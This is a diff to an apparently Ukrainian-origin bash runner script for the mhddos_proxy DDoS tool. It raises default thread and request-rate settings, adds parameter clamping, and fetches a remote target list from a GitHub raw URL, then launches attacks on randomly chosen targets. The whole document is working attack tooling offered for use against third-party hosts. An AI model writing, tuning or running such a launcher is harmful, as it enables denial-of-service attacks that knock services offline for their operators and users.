@@ -2,7 +2,7 @@
 
 restart_interval=10s
 
-num_of_copies="${1:-2}"
+num_of_copies="${1:-1}"
 
 
 # Цвет текста:
@@ -44,13 +44,29 @@ BGDEF='\033[49m'      #  ${BGDEF}
 #sudo docker kill $(sudo docker ps -aqf ancestor=ghcr.io/porthole-ascend-cinnamon/mhddos_proxy:latest)
 #echo "Docker useless containers killed"
 
-threads="${2:-300}"
+threads="${2:-500}"
+if ((threads < 100));
+then
+	threads=100
+else
+	threads=250
+fi
 threads="-t $threads"
 rpc="${3:-100}"
+if ((rpc < 20));
+then
+	rpc=20
+else
+	rpc=100
+fi
 rpc="--rpc $rpc"
 proxy_interval="300"
 proxy_interval="-p $proxy_interval"
 debug="${4:-}"
+if (("$debug" != "--debug" && "$debug" != ""));
+then
+	debug="--debug"
+fi
 
 
 
@@ -83,7 +99,19 @@ do
    	
    	# Get number of targets in runner_targets. First 5 strings ommited, those are reserved as comments.
    	list_size=$(curl -s https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_test/main/runner_targets | cat | grep "^[^#]" | wc -l)
-   
+   	if ((num_of_copies > list_size));
+	then
+		num_of_copies=$list_size
+	elif (("$num_of_copies" == "all"));
+	then 
+		num_of_copies=$list_size
+	elif ((num_of_copies < 1));
+	then
+		num_of_copies=1
+	else
+		num_of_copies=2
+	fi
+	
   	echo -e "\nNumber of targets in list: " $list_size "\n"
    	echo -e "\nTaking random targets to reduce the load on your CPU(processor)..."
    	random_numbers=$(shuf -i 1-$list_size -n $num_of_copies)
